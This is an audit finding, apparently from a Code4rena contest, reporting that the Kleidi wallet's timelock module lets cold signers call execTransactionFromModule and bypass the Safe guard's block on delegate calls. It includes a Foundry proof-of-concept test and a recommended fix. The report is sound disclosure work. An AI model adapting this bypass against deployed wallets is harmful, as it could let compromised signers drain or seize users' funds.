# Vulnerability details

## Description

When a wallet is created, a Gnosis safe and a timelock get created, this timelock is added as a module in the safe. Upon creation, the protocol also sets [Guard](https://github.com/code-423n4/2024-10-kleidi/blob/main/src/Guard.sol) as the safe's guard. This guard blocks any delegate and self-calls, https://github.com/code-423n4/2024-10-kleidi/blob/main/src/Guard.sol#L43-L69.

This is done to block owners from rotating owners or adding/removing modules, in simpler words, this blocks owners from changing the wallet's safe configuration, from the contest [docs](https://github.com/code-423n4/2024-10-kleidi?tab=readme-ov-file#architecture):
>Guard: This contract restricts the the multisig by disallowing delegate and self calls. This removes multicall functionality from the Gnosis Safe while enabled. Additionally, it stops owners from being rotated out of the multisig (except by modules), stops additional modules from being added or removed during a transaction, and prevents the guard from being disabled by a transaction. With these checks in place, it is impossible to remove the guard, rotate signers, or add new modules to the multisig without a timelocked transaction passing.

The guard check is being called on every `execTransaction`, https://github.com/safe-global/safe-smart-account/blob/v1.3.0/contracts/GnosisSafe.sol#L149-L166.

However, the timelock is a module in the safe, and it allows arbitrary calls to any address, so cold signers could call `execTransactionFromModule` on the safe to bypass all of the above checks, violating and bypassing the guard's role, https://github.com/safe-global/safe-smart-account/blob/v1.3.0/contracts/base/ModuleManager.sol#L61-L73.

**A couple of notes:**
This is not similar to the known issue mentioned, https://github.com/code-423n4/2024-10-kleidi?tab=readme-ov-file#automated-findings--publicly-known-issues:
>If the cold signers are malicious or compromised, they can execute transactions to compromise the system if neither recovery spells or the guardian are used

This is because here we can have both a recovery spell and guard set and still have this exploitable. Assuming a recovery spell is set, the protocol encourages users to have a timelock delay less than that of the recovery spell, https://github.com/code-423n4/2024-10-kleidi/blob/main/docs/EDGECASES.md#timelock:
>It is recommended to have the timelock delay be shorter than the recovery spell delay so that the timelock can cancel malicious recovery spells.

So malicious/compromised cold signers will have enough time to schedule and execute the attack. This is aside from the impact that no delegate or self-calls are allowed, which was bypassed.


## Proof of Concept

The following test shows a simple scenario where the safe executes a delegate call on an external contract.

Delegate tester contract:

```solidity
contract DelegateTester {
    address public self;

    constructor() {
        self = address(this);
    }

    function checkIfDelegate() public view {
        console.log("address(this): %s", address(this));
        console.log("self:          %s", self);
        require(address(this) != self, "not delegate");
    }
}
```

Add the following test in `test/integration/System.t.sol`, and run it using `forge test -vv --fork-url "https://mainnet.infura.io/v3/PROJECT_ID" --fork-block-number 20515328 --mt test_BypassGuardChecks`:

```solidity
function test_BypassGuardChecks() public {
    DelegateTester delegateTester = new DelegateTester();
    address owner = vm.addr(1);
    bytes32 salt = bytes32("1");

    // Wallet owners
    address[] memory owners = new address[](1);
    owners[0] = owner;

    // Wallet hot signers
    address[] memory hotSigners = new address[](1);
    hotSigners[0] = HOT_SIGNER_ONE;

    // Deploy wallet
    vm.prank(HOT_SIGNER_ONE);
    SystemInstance memory wallet = deployer.createSystemInstance(
        NewInstance({
            owners: owners,
            threshold: 1,
            recoverySpells: new address[](0),
            timelockParams: DeploymentParams(
                MIN_DELAY,
                EXPIRATION_PERIOD,
                guardian,
                PAUSE_DURATION,
                hotSigners,
                new address[](0),
                new bytes4[](0),
                new uint16[](0),
                new uint16[](0),
                new bytes[][](0),
                bytes32(0)
            )
        })
    );

    Safe safe = Safe(payable(address(wallet.safe)));
    console.log("safe:          %s", address(safe));

    // Construct the delegate TX that will be fired from the safe
    bytes memory delegateTX = abi.encodeWithSelector(
        ModuleManager.execTransactionFromModule.selector,
        address(delegateTester),
        0,
        abi.encodeWithSelector(DelegateTester.checkIfDelegate.selector),
        Enum.Operation.DelegateCall
    );

    // Construct the transaction that will be scheduled
    bytes memory transaction = abi.encodeWithSelector(
        Timelock.schedule.selector,
        address(safe),
        0,
        delegateTX,
        salt,
        MIN_DELAY
    );

    // Sign the transaction
    bytes memory signature = abi.encodePacked(
        signTx(
            safe.getTransactionHash(
                address(wallet.timelock),
                0,
                transaction,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                address(0),
                safe.nonce()
            ),
            1
        )
    );

    // Execute the transaction on the safe which schedules the delegate TX
    safe.execTransaction(
        address(wallet.timelock),
        0,
        transaction,
        Enum.Operation.Call,
        0,
        0,
        0,
        address(0),
        payable(address(0)),
        signature
    );

    vm.warp(block.timestamp + MIN_DELAY + 1);

    // Execute the delegate TX
    wallet.timelock.execute(address(safe), 0, delegateTX, salt);
}
```

## Recommended Mitigation Steps

Block any scheduling or executing of any calls from the timelock to the safe, i.e. always check that `target != address(safe)`.
